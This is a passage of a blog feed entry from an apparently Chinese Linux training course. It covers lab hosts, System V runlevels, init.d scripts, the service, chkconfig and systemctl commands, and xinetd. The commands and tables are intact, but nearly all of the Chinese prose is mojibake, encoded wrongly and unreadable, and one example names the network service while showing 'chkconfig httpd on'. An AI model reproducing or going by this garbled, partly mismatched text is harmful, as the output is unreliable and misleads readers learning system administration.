align="left">hostname</th><th align="left">ipaddr</th></tr></thead><tbody><tr><td align="left">rhel7</td><td align="left">172.25.N.10</td></tr><tr><td align="left">rhel6</td><td align="left">172.25.N.11</td></tr><tr><td align="left">winxp</td><td align="left">172.25.N.12</td></tr><tr><td align="left">ubuntu</td><td align="left">172.25.N.14</td></tr><tr><td align="left">win2012r2</td><td align="left">172.25.N.15</td></tr></tbody></table><p>rhel6ã€rhel7ã€ubuntu1604è™šæ‹Ÿæœºå‡é…ç½®ä¸¤å—è™šæ‹Ÿç¡¬ç›˜vdaå’Œvdbï¼Œä»¥æ–¹ä¾¿æˆè¯¾æ¼”ç¤ºã€‚é™¤winxpå’Œwin2012r2ä¹‹å¤–å…¶å®ƒè™šæ‹Ÿæœºå‡é…ç½®2GBè¿è¡Œå†…å­˜ï¼Œwinxpé…ç½®1GBè¿è¡Œå†…å­˜ï¼Œwin2012r2é…ç½®4GBè¿è¡Œå†…å­˜ã€‚</p><p>winxpè™šæ‹Ÿæœºä¸»æœºä¸Šå®‰è£…äº†å¦‚ä¸‹è½¯ä»¶ï¼š</p><ul><li>Cisco Packet Tracer</li><li>Putty</li><li>Winscp</li><li>Xshell</li><li>Wireshark</li><li>Navicat for Mysql</li><li>Microsoft Visio 2010</li><li>7-zip</li></ul><p>å·²åœ¨classroomä¸Šå®ŒæˆDNSé…ç½®ï¼Œæ­£å‘å’Œæ–¹å‘åŸŸååŠé‚®ä»¶ä»£ç†åŸŸåå’Œè™šæ‹ŸæœºåŸŸåè®¾ç½®å¦‚ä¸‹ï¼š</p><p>rhel7ä¸»æœºï¼š172.25.N.10</p><ul><li>rhel7-fN.example.com</li><li>dN.example.com</li><li>imapN.example.com</li><li>smtpN.example.com (MX)</li></ul><p>rhel6ä¸»æœºï¼š 172.25.N.11</p><ul><li>rhel6-fN.example.com</li><li>sN.example.com</li><li>wwwN.example.com</li><li>webapp-fN.example.com</li></ul><p>winxpä¸»æœºï¼š 172.25.N.12</p><ul><li>winxp-fN.example.com</li><li>install ä¸»æœºï¼š172.25.N.13</li><li>install-fN.example.com</li><li>ubuntuä¸»æœºï¼š172.25.N.14</li><li>ubuntu-fN.example.com</li></ul><p>win2012r2ä¸»æœºï¼š172.25.N.15</p><ul><li>win2012r2-fN.example.com</li></ul><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p>rhel6.5 SElinuxæœ‰bugï¼Œå…‰ç›˜ä¸­é»˜è®¤æ²¡æœ‰selinuxç›¸å…³manpageï¼Œçœ‹manpageéœ€è¦å®‰è£…selinux-policy-docåŒ…ï¼Œä½†è¿™ä¸ªåŒ…éœ€è¦ä»RHNä¸‹è½½ã€‚</p><h3 id="ç½‘ç»œæ‹“æ‰‘å›¾"><a href="#ç½‘ç»œæ‹“æ‰‘å›¾" class="headerlink" title="ç½‘ç»œæ‹“æ‰‘å›¾"></a>ç½‘ç»œæ‹“æ‰‘å›¾</h3><p><img src="pic/01-up100.png" alt="up100"></p><hr><h2 id="åŸºç¡€æœåŠ¡ç®€ä»‹"><a href="#åŸºç¡€æœåŠ¡ç®€ä»‹" class="headerlink" title="åŸºç¡€æœåŠ¡ç®€ä»‹"></a>åŸºç¡€æœåŠ¡ç®€ä»‹</h2><p>æœ¬ç« å°†è®²è§£ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>RHEL6 ä¸­Linuxç³»ç»ŸæœåŠ¡çš„åŸºç¡€çŸ¥è¯†ã€System Vä¸Xinetdçš„æ¦‚å¿µï¼Œä»¥åŠé€šè¿‡ servcie å‘½ä»¤æ¥å¯åŠ¨æŸä¸€æœåŠ¡ï¼Œé€šè¿‡ chkconfig å‘½ä»¤æ¥è®¾ç½®æœåŠ¡æ˜¯å¦å¼€æœºå¯åŠ¨</li><li>RHEL7 ä¸­ å·²ç»æ›¿æ¢æ‰ System V initï¼Œå¹¶æ­£å¼é‡‡ç”¨å…¨æ–°çš„åˆå§‹åŒ–è¿›ç¨‹ Systemdï¼Œä»¥åŠé€šè¿‡systemctl å‘½ä»¤æ¥å¯åŠ¨æŸä¸€æœåŠ¡å’Œè®¾ç½®è¯¥æœåŠ¡æ˜¯å¦å¼€æœºå¯åŠ¨</li></ul><blockquote><p>é‡ç‚¹ç®€ä»‹rhel6ï¼Œrhel7åªåšå‘½ä»¤çš„ä»‹ç»ï¼Œå…·ä½“å†…å®¹è¯·å‚è€ƒã€Šsystemdè¯´æ˜ã€‹</p></blockquote><h3 id="ç³»ç»ŸæœåŠ¡çš„åŸºæœ¬æ¦‚å¿µ"><a href="#ç³»ç»ŸæœåŠ¡çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ç³»ç»ŸæœåŠ¡çš„åŸºæœ¬æ¦‚å¿µ"></a>ç³»ç»ŸæœåŠ¡çš„åŸºæœ¬æ¦‚å¿µ</h3><p>æœåŠ¡ï¼Œå…¶å®å°±æ˜¯è¿è¡Œåœ¨æ“ä½œç³»ç»Ÿåå°çš„ä¸€ä¸ªæˆ–è€…å¤šä¸ªåº”ç”¨ç¨‹åºï¼Œä¸ºè®¡ç®—æœºç³»ç»Ÿæˆ–ç”¨æˆ·æä¾›æŸé¡¹ç‰¹å®šçš„æœåŠ¡ã€‚</p><p>åœ¨æˆ‘ä»¬çš„windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œå…¶åœ¨åå°ä¹Ÿè¿è¡Œäº†è®¸è®¸å¤šå¤šçš„æœåŠ¡ã€‚ä¾‹å¦‚æˆ‘ä»¬è£…çš„æ€æ¯’è½¯ä»¶ï¼Œå…¶åœ¨åå°è¿è¡Œäº†è®¸å¤šæˆ‘ä»¬çœ‹ä¸è§çš„æœåŠ¡ç¨‹åºï¼Œé€šè¿‡è¿™äº›æœåŠ¡æ¥ä¸ºç”¨æˆ·æˆ–è€…è®¡ç®—æœºç³»ç»Ÿæ¥æé«˜ç‰¹å®šçš„åŠŸèƒ½ã€‚</p><p>æœåŠ¡é€šå¸¸æ˜¯ä¸ä¸­æ–­è¿è¡Œçš„ï¼Œéšæ—¶å‡†å¤‡æ¥å—è¯·æ±‚ï¼Œä»è€Œæä¾›æŸé¡¹æœåŠ¡ã€‚ä¾‹å¦‚æˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„ç½‘é¡µæœåŠ¡ï¼Œå…¶å°±æ˜¯ç”±ä¸€ä¸ªè¿è¡Œåœ¨æ‰€è®¿é—®ç½‘ç«™çš„æœåŠ¡å™¨ä¸Šçš„httpdæœåŠ¡æä¾›çš„æœåŠ¡ï¼Œæˆ‘ä»¬é€šè¿‡åœ¨æµè§ˆå™¨è¾“å…¥éœ€è¦è®¿é—®ç½‘ç«™çš„åŸŸåï¼ŒæœåŠ¡å™¨ç«¯çš„httpdæœåŠ¡å°±ä¼šéšæ—¶çš„æ¥æ”¶æˆ‘ä»¬å‘é€è¿‡æ¥çš„è¯·æ±‚ï¼Œå¹¶å“åº”å›ç»™æˆ‘ä»¬çš„ç”¨æˆ·ã€‚</p><p>æˆ‘ä»¬Linuxç³»ç»Ÿç»å¤§å¤šæ•°æœåŠ¡éƒ½æ˜¯ç½‘ç»œæœåŠ¡ï¼Œä¾‹å¦‚é‚®ä»¶æœåŠ¡ã€FTPæœåŠ¡ã€httpdæœåŠ¡ç­‰ç­‰ï¼Œç½‘ç»œæœåŠ¡å¯ä»¥ä½¿ä¸ºå…¶ä»–ç”¨æˆ·ã€å…¶ä»–è®¡ç®—æœºæä¾›ç‰¹å®šçš„æœåŠ¡ã€‚</p><h3 id="services-å’Œ-daemons"><a href="#services-å’Œ-daemons" class="headerlink" title="services å’Œ daemons"></a>services å’Œ daemons</h3><table><thead><tr><th align="left">æœåŠ¡å</th><th align="left">å®ˆæŠ¤è¿›ç¨‹å</th></tr></thead><tbody><tr><td align="left">rsyslog</td><td align="left">rsyslogd</td></tr><tr><td align="left">atd</td><td align="left">atd</td></tr><tr><td align="left">crond</td><td align="left">crond</td></tr></tbody></table><p><strong>æœåŠ¡çš„åˆ†ç±»</strong> æœåŠ¡åé€šå¸¸æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªè¿™ä¸ªåŸºäºç¨‹åºçš„æœåŠ¡åç§°ï¼Œæˆ‘ä»¬æŠŠå®ƒå«åšserviceï¼Œæ¯”å¦‚è¯´ftpæœåŠ¡ï¼ŒsambaæœåŠ¡ç­‰ç­‰ã€‚<br>è¿˜æœ‰ä¸€ä¸ªæ˜¯åŸºäºè¿›ç¨‹çš„æœåŠ¡åç§°ï¼Œæˆ‘ä»¬é€šå¸¸æŠŠå®ƒå«åšdaemonï¼Œå®ˆæŠ¤è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨pså‘½ä»¤æ—¶å€™çœ‹åˆ°çš„åç§°ï¼Œæ¯”å¦‚httpdï¼Œæ¯”å¦‚namedä¹‹ç±»çš„ç­‰ç­‰ï¼Œä¸€èˆ¬æœåŠ¡çš„è¿›ç¨‹åéƒ½æ˜¯ç¨‹åºåç§°ååŠ ä¸Šä¸€ä¸ªdï¼Œå½“ç„¶ä¹Ÿæœ‰ä¸å°‘çš„ç‰¹ä¾‹ã€‚ä¹‹åæˆ‘ä»¬éƒ½ä¼šä¸€ä¸€å»è¯´è¿™äº›æœåŠ¡ã€‚</p><h3 id="åŸºäº-daemon-åˆ†ç±»"><a href="#åŸºäº-daemon-åˆ†ç±»" class="headerlink" title="åŸºäº daemon åˆ†ç±»"></a>åŸºäº daemon åˆ†ç±»</h3><p>é‚£ä¹ˆæ ¹æ®daemonï¼Œä¹Ÿå°±æ˜¯å®ˆæŠ¤è¿›ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæœåŠ¡åˆ†æˆä¸¤ç±»ï¼Œä¸€ç±»æ˜¯ç‹¬ç«‹å¯åŠ¨çš„æœåŠ¡ï¼Œå«åšstand alone daemonï¼Œæˆ‘ä»¬ä¹‹åå­¦çš„æœåŠ¡åŸºæœ¬ä¸Šéƒ½æ˜¯ç‹¬ç«‹å¯åŠ¨çš„æœåŠ¡ã€‚å¦å¤–ä¸€ç§å«åšsuper daemonã€‚æˆ‘ä»¬åˆ†å¼€æ¥æ¥è¯´ä¸€ä¸‹è¿™ä¸¤ç§æœåŠ¡çš„ç‰¹å¾ã€‚</p><ul><li>1&gt; stand alone daemon ç‹¬ç«‹å¯åŠ¨æœåŠ¡</li><li>2&gt; super daemon è¶…çº§æœåŠ¡ xinted</li></ul><h4 id="System-V"><a href="#System-V" class="headerlink" title="System V"></a>System V</h4><p>æ€»çš„æ¥è¯´ï¼ŒLinuxç³»ç»Ÿé€šå¸¸ä½œä¸ºæœåŠ¡å™¨ç«¯çš„æ“ä½œç³»ç»Ÿæ¥ç”¨çš„ï¼Œæ‰€ä»¥Linuxç³»ç»Ÿæä¾›äº†è®¸è®¸å¤šçš„çš„æœåŠ¡ï¼Œæœ‰äº›æœåŠ¡éœ€è¦æˆ‘ä»¬è‡ªå·±æ¥è¿›è¡Œé…ç½®ï¼Œè¿™äº›æœåŠ¡çš„ç›®çš„å°±æ˜¯ä¸ºäº†ç»™æˆ‘ä»¬çš„è®¡ç®—æœºã€ç”¨æˆ·æä¾›æŸé¡¹ç‰¹å®šçš„åŠŸèƒ½ã€‚é‚£ä¹ˆå¯¹äºå„ç§ä¸åŒçš„æœåŠ¡ï¼ŒLinuxç³»ç»Ÿæ˜¯æ€ä¹ˆæ ·æ¥ç»Ÿä¸€è¿›è¡Œç®¡ç†çš„å‘¢ï¼Ÿ</p><p>åœ¨Linuxæ“ä½œç³»ç»Ÿä¸­ï¼ŒLinuxå¯¹äºæœåŠ¡çš„ç®¡ç†ä½“ç³»æ˜¯æ²¿ç”¨äº†System Vçš„æœåŠ¡ç®¡ç†ä½“ç³»ï¼ŒSystem VåŸæ¥æ˜¯æ—©æœŸAT&amp;Tçš„ä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚</p><p>å¯¹äºLinuxç³»ç»Ÿï¼ŒSystem Væä¾›äº†è¿è¡Œçº§åˆ«çš„æ¦‚å¿µï¼Œè¿˜è®°å¾—ä¹‹å‰ä¸€ç›´æåˆ°è¿‡çš„Linuxçš„å¯åŠ¨è¿è¡Œçº§åˆ«å—ï¼Ÿæ²¡é”™ï¼ŒSystem Vä¸€å…±æä¾›äº†7ç§è¿è¡Œçº§åˆ«</p><p>0   å…³æœº</p><p>1   å•ç”¨æˆ·æ¨¡å¼</p><p>2   ä¸å¸¦ç½‘ç»œçš„å¤šç”¨æˆ·æ¨¡å¼</p><p>3   å¸¦ç½‘ç»œçš„å¤šç”¨æˆ·æ¨¡å¼ï¼Œçº¯æ–‡æœ¬ç•Œé¢</p><p>4   æœªä½¿ç”¨</p><p>5   å¸¦ç½‘ç»œçš„å¤šç”¨æˆ·æ¨¡å¼ï¼Œå›¾å½¢ç•Œé¢</p><p>6   é‡å¯</p><p>å¯¹äºæˆ‘ä»¬æ¥è¯´ï¼Œé€šå¸¸ä½¿ç”¨çš„æ˜¯çº§åˆ«3å’Œçº§åˆ«5ï¼Œæ¯ä¸ªçº§åˆ«ä¸‹éƒ½æœ‰å¯¹åº”çš„å¯åŠ¨ã€ä¸å¯åŠ¨çš„æœåŠ¡ï¼Œæ¯”å¦‚å•ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰çš„æœåŠ¡éƒ½æ˜¯ä¸å¯åŠ¨ï¼Œè¿™äº›éƒ½æ˜¯é€šè¿‡System Vè¿™ä¸ªæœåŠ¡ç®¡ç†ä½“ç³»æ¥å†³å®šçš„</p><p>System Vå®šä¹‰äº†initä¸ºç³»ç»Ÿå¯åŠ¨çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿›ç¨‹PID=1ï¼Œè¿™ä¸ªè¿›ç¨‹çš„ç›®çš„å°±æ˜¯å»æŸ¥çœ‹ /etc/inittab ä¸­çš„ç³»ç»Ÿå¯åŠ¨çº§åˆ«ä»è€Œæ¥å¯åŠ¨å¯¹åº”çš„æœåŠ¡</p><p>å¯¹äºä¸åŒçš„æœåŠ¡ï¼Œå› ä¸ºå…¶æä¾›è¯¥æœåŠ¡çš„å‚å®¶ä¸åŒï¼Œæ‰€ä»¥è¿™äº›çš„æœåŠ¡çš„å¯åŠ¨ã€å…³é—­æœºåˆ¶é€šå¸¸ä¸åŒï¼Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œä¸ºäº†æ–¹ä¾¿çš„ç®¡ç†è¿™äº›æœåŠ¡ï¼Œæ¯ä¸ªæœåŠ¡çš„å¯åŠ¨ã€ç»“æŸã€é‡å¯ç­‰æ“ä½œéƒ½ç”±ä¸€ä¸ªSystem Vè„šæœ¬æ¥è¿›è¡Œæ§åˆ¶ï¼Œæ‹¥æœ‰å›ºå®šçš„æ ¼å¼ã€‚</p><p>å¯¹äºLinuxç³»ç»Ÿä¸Šçš„æœåŠ¡ï¼Œè¿™äº›æœåŠ¡çš„System Vè„šæœ¬æ–‡ä»¶éƒ½æ˜¯å­˜æ”¾åœ¨ /etc/rc.d/init.d è¿™ä¸ªç›®å½•ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# cd /etc/rc.d/init.d/</span><br><span class="line">[root@rhel6 ~]# ls</span><br><span class="line">abrt-ccpp         firstboot     messagebus      quota_nld    snmptrapd</span><br><span class="line">abrtd             functions     mysqld          rdisc        spice-vdagentd</span><br><span class="line">abrt-oops         haldaemon     netconsole      restorecond  sshd</span><br><span class="line">acpid             halt          netfs           rngd         sssd</span><br><span class="line">atd               htcacheclean  network         rpcbind      sysstat</span><br><span class="line">auditd            httpd         NetworkManager  rpcgssd      udev-post</span><br><span class="line">autofs            ip6tables     nfs             rpcidmapd    vboxadd</span><br><span class="line">blk-availability  iptables      nfslock         rpcsvcgssd   vboxadd-service</span><br><span class="line">bluetooth         irqbalance    ntpd            rsyslog      vboxadd-x11</span><br><span class="line">certmonger        kdump         ntpdate         sandbox      vncserver</span><br><span class="line">cpuspeed          killall       oddjobd         saslauthd    wdaemon</span><br><span class="line">crond             lvm2-lvmetad  portreserve     single       winbind</span><br><span class="line">cups              lvm2-monitor  postfix         smartd       wpa_supplicant</span><br><span class="line">dnsmasq           mdmonitor     psacct          snmpd        ypbind</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œå­˜åœ¨äº†è®¸å¤šçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶éƒ½æ˜¯ç³»ç»Ÿæ¯ä¸€ä¸ªæœåŠ¡çš„System Vçš„è„šæœ¬æ–‡ä»¶ï¼Œå¯¹äºè¯¥è„šæœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬è¦å¯åŠ¨ä»€ä¹ˆæœåŠ¡ï¼Œéƒ½æ˜¯é€šè¿‡è¿™äº›è„šæœ¬æ–‡ä»¶æ¥å¯åŠ¨çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç¼–å†™System Vè„šæœ¬æ–‡ä»¶æ¥æ‰‹å·¥åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„ç”±System Væ¥æ§åˆ¶çš„æœåŠ¡ã€‚</p><p>å¯¹äºLinuxçš„æ‰€æœ‰çš„è¿™äº›æœåŠ¡ï¼Œæˆ‘ä»¬é€šè¿‡ service è¿™ä¸ªå‘½ä»¤æ¥è¿›è¡Œç»Ÿä¸€çš„ç®¡ç†</p><p>å‘½ä»¤ service å¯ä»¥è°ƒç”¨æŒ‡å®šæœåŠ¡çš„System Vè„šæœ¬ï¼Œå¹¶æ‰§è¡ŒæŒ‡å®šçš„åŠ¨ä½œ</p><p><code>service æœåŠ¡å [start | stop | restart | status]</code></p><p>å¯¹äºLinuxç³»ç»Ÿçš„è¿™äº›æœåŠ¡ï¼Œæˆ‘ä»¬éƒ½æ˜¯é€šè¿‡ service è¿™ä¸ªå‘½ä»¤å»è°ƒç”¨è¯¥æœåŠ¡å¯¹åº”çš„System Vè„šæœ¬ï¼Œå¹¶æ‰§è¡Œå…¶æŒ‡å®šçš„åŠ¨ä½œ</p><p>åˆšæ‰æˆ‘ä»¬ä¹Ÿè¯´åˆ°äº†ï¼ŒSystem Vå®šä¹‰äº†è¿è¡Œçº§åˆ«çš„æ¦‚å¿µï¼Œæ¯ä¸ªè¿è¡Œçº§åˆ«å¯¹åº”æœ‰å¯åŠ¨ã€ä¸å¯åŠ¨çš„æœåŠ¡ï¼Œåœ¨ <code>/etc/rc.d</code> è¿™ä¸ªç›®å½•ä¸‹ï¼Œé™¤äº†æˆ‘ä»¬åˆšæ‰çš„ init.d è¿™ä¸ªç›®å½•ï¼Œæˆ‘ä»¬è¿˜å‘ç°è¿˜æœ‰å…¶å®ƒçš„ä¸€äº›ç›®å½•ï¼Œè¯¸å¦‚ rc0.dã€rc1.dç­‰è¿™äº›ç›®å½•å°±åˆ†åˆ«å¯¹åº”äº†ç³»ç»Ÿçš„7ä¸­å¯åŠ¨çº§åˆ«ï¼Œæ¯ä¸ªç›®å½•é‡Œé¢éƒ½å­˜æ”¾äº†è®¸å¤šçš„<br>æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å¯¹åº”ç€ä¸€ä¸ªç‰¹å®šçš„æœåŠ¡ï¼Œå¹¶æ ‡å¿—æœ‰æ˜¯å¦å¼€æœºå¯åŠ¨ä»¥åŠå¯åŠ¨é¡ºåºã€‚</p><p>æˆ‘ä»¬å‘ç°ï¼Œåœ¨è¿™äº›ç›®å½•é‡Œé¢ï¼Œå­˜æ”¾çš„éƒ½æ˜¯é“¾æ¥æ–‡ä»¶ï¼Œä¸è¿‡è¿™æ¯ä¸€ä¸ªé“¾æ¥æ–‡ä»¶çš„åå­—éƒ½æœ‰ç€ä¸¥æ ¼çš„è§„å®šã€‚æ¯ä¸€ä¸ªé“¾æ¥æ–‡ä»¶éƒ½ç”±3éƒ¨åˆ†ç»„æˆ</p><p><code>K15httpd -&gt; ../init.d/httpdã€€ã€€ã€€ã€€S55sshd -&gt; ../init.d/sshd</code></p><ul><li>â‘ ç¬¬ä¸€ä¸ªéƒ¨åˆ†æ˜¯ç¬¬ä¸€ä¸ªå­—æ¯Kæˆ–è€…Sï¼Œè¡¨ç¤ºè¯¥æœåŠ¡æ˜¯ä¸æ˜¯æ˜¯ä¸æ˜¯å¼€æœºè‡ªåŠ¨å¯åŠ¨ï¼ŒKè¡¨ç¤ºå¼€æœºä¸å¯åŠ¨ï¼ŒSè¡¨ç¤ºå¼€æœºå°±å¯åŠ¨</li><li>â‘¡ç¬¬äºŒä¸ªéƒ¨åˆ†æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¿™ä¸ªæ•°å­—ä»£è¡¨çš„æ˜¯è¯¥æœåŠ¡çš„å¯åŠ¨é¡ºåºï¼ŒæœåŠ¡å¯åŠ¨çš„é¡ºåºéå¸¸çš„é‡è¦ï¼Œä¾‹å¦‚æˆ‘ä»¬çš„ç½‘ç»œæœåŠ¡éœ€è¦åœ¨é‚®ä»¶æœåŠ¡ä¹‹å‰å¯åŠ¨</li><li>â‘¢ç¬¬ä¸‰ä¸ªéƒ¨åˆ†å°±æ˜¯å¯¹åº”æœåŠ¡çš„åå­—ï¼Œè¯¥é“¾æ¥æ–‡ä»¶å…¶å®éƒ½æ˜¯æŒ‡å‘çš„æ˜¯ init.d è¿™ä¸ªç›®å½•ä¸‹çš„System Vè„šæœ¬æ–‡ä»¶</li></ul><p>æˆ‘ä»¬å¦‚æœå¸Œæœ›æŸæœåŠ¡å¼€æœºå°±å¯åŠ¨ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ rc5.d ç›®å½•ä¸‹çš„é“¾æ¥æ–‡ä»¶ï¼Œä¸è¿‡è¿™æ ·åšå¾ˆéº»çƒ¦ï¼ŒLinuxç³»ç»Ÿæä¾›äº†ä¸€ä¸ª <code>chkconfig</code> å‘½ä»¤å¯ä»¥æ¥è®¾ç½®æœåŠ¡æ˜¯å¦å¼€æœºå¯åŠ¨</p><p>æˆ‘ä»¬é€šè¿‡ <code>chkconfig --list</code> å‘½ä»¤æ¥æŸ¥çœ‹æ‰€æœ‰æœåŠ¡çš„å¼€æœºå¯åŠ¨æƒ…å†µ</p><p>æ¯”å¦‚æˆ‘ä»¬éœ€è¦è®¾ç½® network æœåŠ¡å¼€å¯è‡ªåŠ¨å¯åŠ¨ï¼Œå¯ä»¥ä½¿ç”¨ <code>chkconfig httpd on</code> å‘½ä»¤å³å¯</p><p>æ¯”å¦‚æˆ‘ä»¬éœ€è¦è®¾ç½® network æœåŠ¡å¼€å¯ä¸å¯åŠ¨ï¼Œå¯ä»¥ä½¿ç”¨ <code>chkconfig httpd off</code> å‘½ä»¤å³å¯</p><h4 id="xinetd"><a href="#xinetd" class="headerlink" title="xinetd"></a>xinetd</h4><p>å…¶å®å¯¹äºä¸Šé¢é€šè¿‡ System Væ¥ç®¡ç†çš„ä¸€äº›æœåŠ¡éƒ½å±äºLinuxç³»ç»Ÿçš„å¸¸é©»è¿è¡Œçš„æœåŠ¡ï¼Œå…¶å®åœ¨Linuxç³»ç»Ÿä¸­è¿˜æœ‰è®¸å¤šä¸å¸¸é©»çš„ä¸€äº›æœåŠ¡ï¼Œä¾‹å¦‚ telnetã€rsyncæœåŠ¡ï¼Œè¿™äº›æœåŠ¡åˆ™æ˜¯é€šè¿‡ xinetd è¿™ä¸ªæœåŠ¡æ¥è¿›è¡Œç®¡ç†çš„ã€‚</p><p>xinetd æ§åˆ¶çš„å°±æ˜¯é‚£äº›ä¸å¸¸é©»çš„æœåŠ¡ï¼ŒåŠŸèƒ½è¾ƒä¸ºç®€å•çš„æœåŠ¡</p><p>xinetdå…¶å®è‡ªå·±æœ¬èº«å°±æ˜¯ä½œä¸ºä¸€ä¸ªç³»ç»Ÿçš„å¸¸é©»çš„æœåŠ¡è¿è¡Œåœ¨åå°ï¼Œè€Œxinetdæ‰€æ§åˆ¶çš„æœåŠ¡åœ¨æ²¡æœ‰è¿æ¥è¯·æ±‚çš„æ—¶å€™æ˜¯ä¸è¿è¡Œçš„ï¼Œæ‰€æœ‰xinetdæ§åˆ¶çš„æœåŠ¡çš„è¿æ¥è¯·æ±‚éƒ½ä¼šæäº¤ç»™xinetdæ¥è¿›è¡Œä»£ç†</p><p>xinetdåœ¨æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚åï¼Œä¼šæ ¹æ®è¯·æ±‚çš„åè®®åŠæœåŠ¡å¯åŠ¨ç›¸åº”çš„æœåŠ¡è¿›ç¨‹ï¼Œè¿›ç¨‹å¤„ç†å®Œåè¯·æ±‚å°±ä¼šç»“æŸ</p><p>xinetdæœ¬èº«å°±æ˜¯ä¸€ä¸ªç³»ç»ŸæœåŠ¡ï¼Œé€šè¿‡ System Væ¥å¯¹å…¶è¿›è¡Œç®¡ç†ï¼Œåœ¨CentOS6/RHEL6ä¸­ï¼ŒxinetdæœåŠ¡é»˜è®¤æ˜¯æ²¡æœ‰å®‰è£…çš„ï¼Œæˆ‘ä»¬è‹¥è¦ä½¿ç”¨è¯¥æœåŠ¡ï¼Œé¦–å…ˆéœ€è¦å®‰è£…å®ƒ<code>yum install xinetd</code></p><p>åœ¨æˆ‘ä»¬å®‰è£…å¥½æˆ‘ä»¬çš„<code>xinetd</code>æœåŠ¡ä»¥åï¼Œæˆ‘ä»¬è¿™æ—¶å†é€šè¿‡ <code>chkconfig --list</code> å‘½ä»¤æ¥æŸ¥çœ‹æ‰€æœ‰çš„æœåŠ¡å¯åŠ¨è®¾ç½®</p><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨å®‰è£…äº†xinetdæœåŠ¡ä»¥åï¼Œå…¶ä¸‹é¢å‡ºç°äº†ä¸€äº›å…¶ä»–çš„æœåŠ¡é€‰é¡¹ï¼Œä¾‹å¦‚<code>rsync</code>ï¼Œ<code>chargen-dgram</code>ç­‰è¿™äº›æœåŠ¡ï¼Œè¿™äº›æœåŠ¡éƒ½æ˜¯ç³»ç»Ÿçš„ä¸€äº›ä¸å¸¸é©»æœåŠ¡ï¼Œéƒ½æ˜¯é€šè¿‡xinetdè¿™ä¸ªæœåŠ¡æ¥å¯¹å…¶è¿›è¡Œç®¡ç†çš„</p><p><code>xinetd</code>æœåŠ¡çš„é…ç½®æ–‡ä»¶æ˜¯ <code>/etc/xinetd.conf</code></p><h3 id="ç«¯å£å·"><a href="#ç«¯å£å·" class="headerlink" title="ç«¯å£å·"></a>ç«¯å£å·</h3><ul><li>æŸ¥çœ‹ <code>netstat -luntp</code></li><li>è½¯ä»¶å    <code>net-tools</code></li></ul><h3 id="åŸºç¡€æœåŠ¡æ€»ç»“"><a href="#åŸºç¡€æœåŠ¡æ€»ç»“" class="headerlink" title="åŸºç¡€æœåŠ¡æ€»ç»“"></a>åŸºç¡€æœåŠ¡æ€»ç»“</h3><p><strong>RHEL 6</strong></p><p>æœåŠ¡çš„å¯åŠ¨ åœæ­¢ é‡å¯ çŠ¶æ€    <code>service æœåŠ¡å [start | stop | restart | status]</code></p><p>æœåŠ¡å¼€æœºå¯åŠ¨çŠ¶æ€        <code>chkconfig --list</code></p><p>è®¾ç½®æœåŠ¡å¼€æœºå¯åŠ¨        <code>chkconfig æœåŠ¡å on</code></p><p>è®¾ç½®æœåŠ¡å¼€æœºä¸å¯åŠ¨        <code>chkconfig æœåŠ¡å off</code></p><p><strong>RHEL 7</strong></p><p>æœåŠ¡çš„å¯åŠ¨ åœæ­¢ é‡å¯ çŠ¶æ€    <code>systemctl [start | stop | restart | status] æœåŠ¡å</code></p><p>è®¾ç½®æœåŠ¡å¼€æœºå¯åŠ¨        <code>systemctl enable æœåŠ¡å</code></p><p>è®¾ç½®æœåŠ¡å¼€æœºä¸å¯åŠ¨        <code>systemctl disable æœåŠ¡å</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;UP100 è¯¾ç¨‹åŸºäºRHEL6.5ã€RHEL7.0ã€ubuntu1604ã€WindowsXPå’ŒWindows2012R2ç³»ç»Ÿ&lt;/p&gt;
&lt;p&gt;éœ€è¦å¼€å¯è™šæ‹Ÿæœºå¯ä»¥ç›´æ¥åŒå‡»å›¾æ ‡ï¼Œç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶å°†ä»è®²å¸ˆæœºä¸‹è½½æ˜ åƒæ–‡ä»¶ï¼Œå¯èƒ½ä¼šæ¯”è¾ƒæ…¢ã€‚&lt;/p&gt;
&lt;p&gt;æ§åˆ¶è™šæ‹Ÿæœºå¯ä»¥ä½¿ç”¨kioskç”¨æˆ·ï¼Œæ‰§
      
    
    </summary>
    
    
      <category term="æŠ€æœ¯åŸ¹è®­" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
